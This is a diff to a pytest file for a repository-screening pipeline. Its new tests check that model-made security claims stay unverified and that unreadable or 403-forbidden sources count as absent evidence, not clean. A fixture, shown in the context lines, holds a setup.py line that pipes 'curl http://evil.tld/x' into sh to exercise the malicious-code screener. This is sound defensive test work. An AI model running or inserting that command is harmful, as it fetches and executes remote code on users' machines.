@@ -9,8 +9,10 @@ from __future__ import annotations
 import pytest
 
 from gitseed.collect.search import Candidate, CollectResult
+from gitseed.evidence import ClaimBasis
 from gitseed.grade.types import GradeResult
-from gitseed.pipeline.run import PipelineResult, Reviewed, ranked, run
+from gitseed.pipeline.run import FileFetchError, PipelineResult, Reviewed, ranked, run
+from gitseed.screen.signals import HIGH, Signal
 
 CLEAN = [("main.py", "def add(a, b):\n    return a + b\n")]
 MALICIOUS = [("setup.py", "import os\nos.system('curl http://evil.tld/x | sh')\n")]
@@ -167,6 +169,75 @@ def test_a_high_severity_candidate_never_reaches_the_grader() -> None:
     assert entry.grade is None
     assert entry.severity == "high"
     assert "screening found" in (entry.withheld or "")
+
+
+def test_a_model_security_claim_is_unverified_not_a_finding(monkeypatch) -> None:
+    # Given: a model-originated security claim is present beside readable source.
+    model_claim = Signal("model-warning", HIGH, "main.py", 1, "suspicious", ClaimBasis.MODEL)
+    monkeypatch.setattr("gitseed.pipeline.run.scan_files", lambda _: [model_claim])
+
+    # When: the pipeline screens and grades the candidate.
+    result = run(
+        CollectResult(candidates=[candidate("a/model-claim")]),
+        fetch_files=files_for({"a/model-claim": CLEAN}),
+        grader=Grader(),
+    )
+
+    # Then: the model claim remains inspectable but cannot manufacture a finding.
+    entry = result.reviewed[0]
+    assert entry.findings == ()
+    assert entry.unverified == (model_claim,)
+    assert entry.severity == "none"
+    assert entry.withheld is None
+
+
+def test_unreadable_source_is_absent_not_a_clean_security_claim() -> None:
+    # Given: the same candidate either yields readable clean source or fails to read.
+    clean = run(
+        CollectResult(candidates=[candidate("a/clean")]),
+        fetch_files=files_for({"a/clean": CLEAN}),
+        grader=Grader(),
+    ).reviewed[0]
+    absent = run(
+        CollectResult(candidates=[candidate("a/absent")]),
+        fetch_files=lambda _: (_ for _ in ()).throw(OSError("offline")),
+        grader=Grader(),
+    ).reviewed[0]
+
+    # When/Then: zero findings means different things with and without evidence.
+    assert clean.findings == absent.findings == ()
+    assert clean.screening_basis is ClaimBasis.DETERMINISTIC
+    assert clean.screened_files == ("main.py",)
+    assert absent.screening_basis is ClaimBasis.ABSENT
+    assert absent.screened_files == ()
+
+
+def test_a_forbidden_resource_is_absent_not_a_clean_or_false_result() -> None:
+    """Issue #6: the branch a real 403-forbidden response drives.
+
+    `GitHubClient.fetch_files` raises `FileFetchError`, not a bare exception, for
+    a forbidden resource -- a distinct branch from the generic-exception path
+    covered by `test_unreadable_source_is_absent_not_a_clean_security_claim`
+    above. Mutating this branch's `severity` from `"unknown"` to `"none"` (a
+    clean scan) passed the full suite before this test existed: nothing checked
+    it. A forbidden resource must read the same as any other absent evidence --
+    not as "screened and found nothing" and not as a falsy-but-present score.
+    """
+
+    def forbidden(_: Candidate):
+        raise FileFetchError("GitHub access is forbidden; waiting will not help")
+
+    result = run(
+        CollectResult(candidates=[candidate("torvalds/linux")]),
+        fetch_files=forbidden,
+        grader=Grader(),
+    )
+    entry = result.reviewed[0]
+    assert entry.severity == "unknown"
+    assert entry.screening_basis is ClaimBasis.ABSENT
+    assert entry.score is None
+    assert entry.withheld is not None and "forbidden" in entry.withheld
+    assert result.complete is False
 
 
 def test_a_blocked_candidate_does_not_make_the_run_incomplete() -> None:
